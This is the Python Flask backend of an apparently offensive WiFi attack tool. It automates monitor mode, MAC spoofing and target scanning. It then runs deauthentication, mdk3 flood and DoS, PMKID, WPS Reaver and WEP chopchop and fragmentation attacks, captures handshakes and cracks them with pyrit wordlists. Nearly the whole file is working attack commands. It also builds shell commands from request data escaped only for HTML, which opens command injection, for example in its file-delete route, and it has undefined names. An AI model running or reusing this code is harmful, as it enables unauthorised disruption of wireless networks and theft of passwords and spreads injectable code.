from os import listdir, pardir
from os.path import abspath, dirname, isfile, join
import threading
import subprocess
from markupsafe import escape
from flask import request
from app import app, config
from werkzeug.utils import secure_filename

#Variables
scanning = False
path = config['server']['filePath']
mac = f"{config['mac']['oui']}:12:8c:b6"
netcardMon = ""
bssid = ""
essid = ""
channel = ""

from app.utils import *

@app.get('/')
def index():
    try:
        mkdir = f'mkdir {path}'
        subprocess.run(mkdir, check=True, shell=True, capture_output=True)
        return ret({"status": "OK"})
    
    except Exception as e:
        # Manejar otras excepciones generales
        return ret({"status": f"Error creating the folder: {str(e)}"}, 500)

@app.get('/netcard')
def getNetcardMon():
    try:
        listNetcards = 'iwconfig 2>&1 | grep "ESSID" | while read netcard text; do echo "$netcard"; done'
        output = subprocess.run(listNetcards, check=True, shell=True, capture_output=True)
        netcards_list = output.stdout.decode().split('\n')[:-1]
        return ret({"netcards": netcards_list})
    
    except Exception as e:
        return ret({"status": f"Error with netcards: {str(e)}"}, 500)
    
@app.post('/netcard')
def setNetcardMon():
    global netcardMon 
    global scanning 

    try:
        data = req(request)
        netcard = escape(data.get('netcard', ''))
        netcardMon = netcard + "mon"

        startMon = f'airmon-ng check kill && airmon-ng start {netcard}'
        subprocess.run(startMon, check=True, shell=True)

        changeMac = f'ifconfig {netcardMon} down && macchanger --mac={mac} {netcardMon} && ifconfig {netcardMon} up'
        subprocess.run(changeMac, check=True, shell=True)

        return  ret({"netcard": f"{netcardMon}", "mac": f"{mac}"})

    except Exception as e:
        return ret({"status": f"Error in Monitor mode: {str(e)}"}, 500)

@app.get('/stop')
def stopNetcardMon():
    global scanning

    try:
        scanning = False

        stopServices = f'killall airodump-ng | airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'
        subprocess.run(stopServices, check=True, shell=True)

        clean(path)
        clean(path, True)

        return ret({"status": "OK"})

    except Exception as e:
        return ret({"status": f"Error stoping Services: {str(e)}"}, 500)

@app.get('/scan')
def scan():
    global scanning 
    clean(path)
    try:
        startScan = f'airodump-ng -w {path}/dumpData --output-format csv {netcardMon} > /dev/null'
        subprocess.Popen(startScan, shell=True)

        scanning = True
        readScan()
        #threading.Thread(target=readScan).start()
            
        return ret({"status":"OK"})
    except Exception as e:
        return ret({"status": f"Error scanning: {str(e)}"}, 500)


@app.post('/target')
def target():
    global bssid
    global essid
    global channel

    try:
        data = req(request)
        bssid = escape(data.get('bssid', ''))
        essid = escape(data.get('essid', ''))
        channel = escape(data.get('channel', ''))

        return ret({"status": "OK"})

    except Exception as e:
        return ret({"status": f"Target selection error: {str(e)}"}, 500)

@app.post('/attack/<int:id>')
def attack(id):
    
    clean(path, True)
    try:
        startScan = f'airodump-ng -w {path}/dumpDataAttack -c {channel} --bssid {bssid} {netcardMon} > {path}/tempScan'
        process = subprocess.Popen(startScan, shell=True)

        sleep(3)

        match id:
            #WPA/WPA2 With Clients
            case 0: #Deauthentication
                data = req(request)
                nPackets = escape(data.get('n'))
                attack = f'aireplay-ng -0 {nPackets} -a {bssid} {netcardMon}'
                pass
            case 1: #Fake DoS Attack
                attack = f'mdk3 a -a {bssid} {netcardMon}'
                pass
            case 2: #Beacon Flood Mode Attack
                fakeNet = escape(data.get('fn', ''))
                attack = f'mdk3 b -f FakeNetworks/{fakeNet} -a -s 1000 -c {channel} {netcardMon}'
                pass
            case 3: #Disassociation Amok Mode Attack
                attack = f'mdk3 d -w blacklist -c 1 {netcardMon}'
                pass
            case 4: #Michael Shutdown Explotation
                attack = f'mdk3 m -t {bssid} {netcardMon}'
                pass

            #WPA/WPA2 Without Clients
            case 5: #PMKID
                attack = f'hcxdumptool -i {netcardMon} -o captura --enable_status=1'
                extract = f'hcxpcaptool -z hashes captura'
                pass

            #WPS
            case 6: #Reaver Pin Attack
                attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && reaver -i {netcardMon} -b {bssid} -c {channel} -N -L'
                pass

            #WEP 
            case 7: #Fake Authentication Attack
                attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -2 -p 0841 -b {bssid} -h {mac} {netcardMon}'
                extract = f'aircrack-ng -b {bssid} {path}/dumpDataAttack-01.cap'
                pass
            case 8: #Fake Authentication Attack + Chopchop
                attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -4 -b {bssid} -h {mac} {netcardMon}'
                packetforge = f'packetforge-ng -0 -a {bssid} -h {mac} -k 255.255.255.255 -l 255.255.255.255 -y {path}/xor -w {path}/pf'
                extract = f'aireplay-ng -2 -r {path}/pf {netcardMon} && aircrack-ng {path}/dumpDataAttack-01.cap'
                pass
            case 9: #Fake Authentication Attack + Fragmentation
                attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -5 -b {bssid} -h {mac} {netcardMon}'
                packetforge = f'packetforge-ng -0 -a {bssid} -h {mac} -k 255.255.255.255 -l 255.255.255.255 -y {path}/xor -w {path}/pf'
                extract = f'aireplay-ng -2 -r {path}/pf {netcardMon} && aircrack-ng {path}/dumpDataAttack-01.cap'
                pass

        subprocess.run(attack, check=True, shell=True)
    except Exception as e:
        return ret({"status": f"Error Attacking: {str(e)}"}, 500)
        
    try:
        waitHandshake(path)
        
        #Finish scan
        process.terminate()

        #Comprobar handshake
        subprocess.run(f'pyrit -r {path}/dumpDataAttack-01.cap analyze', shell=True)

        #Guardar handshake
        subprocess.run(f'cp {path}/dumpDataAttack-01.cap hashDB/{essid}_{bssid}.cap', shell=True)
        
        return ret({"status":"OK"})
    except Exception as e:
        return ret({"status": f"HandShake not captured: {str(e)}"}, 500)

###Cracking

##Cracking con Pyrit a través de ataque por Base de Datos RAINBOW TABLE
@app.post('/crack/<string:wordlist>')
def cracker(wordlist):
    try:
        wordlist = escape(wordlist)
        data = req(request)
        hash = escape(data.get('hash', ''))
        essid = hash.split('_')[0]
        # Define DB
        defineDB = f'pyrit -i Wordlist/{wordlist} import_passwords'
        subprocess.run(defineDB, check=True, shell=True)

        # Define ESSID
        defineDB = f'pyrit -e {essid} create_essid'
        subprocess.run(defineDB, check=True, shell=True)

        # Generate PMKs
        generatePMKS = 'pyrit batch'
        subprocess.run(generatePMKS, check=True, shell=True)

        # Start cracking
        startCrack = f'pyrit -r hashDB/{hash} attack_db > {path}/{hash.replace(".cap", "")}'
        subprocess.run(startCrack, check=True, shell=True)

        extractPassword(f'{path}/{hash.replace(".cap", "")}', f'passDB/{hash.replace(".cap", "")}')

        return ret({"status": "OK"})

    except Exception as e:
        return ret({"status": f"Cracking error: {str(e)}"}, 500)


###Uploads

##Upload wordlists or fakeNetworks
@app.post('/list/<string:list>')
def setList(list):
    try:
        list = escape(list)
        f = request.files['file']
        f.save(f'{list}/{secure_filename(f.filename)}')

        return ret({"status": f"saved on {list}/{secure_filename(f.filename)}"})

    except Exception as e:
        return ret({"status": f"Error uploading file: {str(e)}"}, 500)

@app.post('/deleteFile/<string:list>')
def deleteFile(list):
    try:
        list = escape(list)
        data = req(request)
        f = escape(data.get('file', ''))
        delete = f'rm {list}/{f}'
        subprocess.run(delete, check=True, capture_output=True, text=True, shell=True)

        return ret({"status": f"deleted on {list}/{secure_filename(f)}"})

    except Exception as e:
        return ret({"status": f"Error deleting file: {str(e)}"}, 500)

@app.get('/list/<string:list>')
def getLists(list):
    try:
        list = escape(list)
        current_directory = abspath(dirname(__file__))
        parent_directory = abspath(join(current_directory, pardir))
        folder_path = join(parent_directory, list)

        file_list = [f for f in listdir(folder_path) if isfile(join(folder_path, f))]

        if list == "passDB":
            key_list = [{'apName': f.split('_')[0], 'bssid': f.split('_')[1].replace('.cap', ''), 'password': readPasswordFromFile(join(folder_path, f))} for f in file_list]
        elif list == "hashDB":
            key_list = [{'apName': f.split('_')[0], 'bssid': f.split('_')[1].replace('.cap', ''), 'password': None} for f in file_list]
        else:
            key_list = file_list

        return ret({"ls": key_list})

    except Exception as e:
        return ret({"status": f"Error listing files: {str(e)}"}, 500)